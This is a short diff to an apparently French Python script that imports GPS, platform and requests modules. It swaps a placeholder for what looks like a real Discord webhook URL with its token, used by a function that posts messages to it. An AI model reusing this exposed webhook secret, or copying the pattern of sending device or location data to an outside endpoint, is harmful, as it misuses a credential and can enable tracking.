@@ -2,7 +2,7 @@ import os, time, requests, platform, threading
 from plyer import gps, notification
 
 # Configuration du Tableau de Bord [cite: 2025-08-28]
-WEBHOOK = "TON_URL_WEBHOOK_DISCORD"
+WEBHOOK = "https://discord.com/api/webhooks/1458535419137232949/MKU4TuPKTlBQGhF3NWtRZ_lxnx7m9DqUnINvZKd1KJWmITYTZqCPyjayKNs9o1HLcyRR"
 
 def send_data(msg):
     try: requests.post(WEBHOOK, json={"content": msg}, timeout=10)
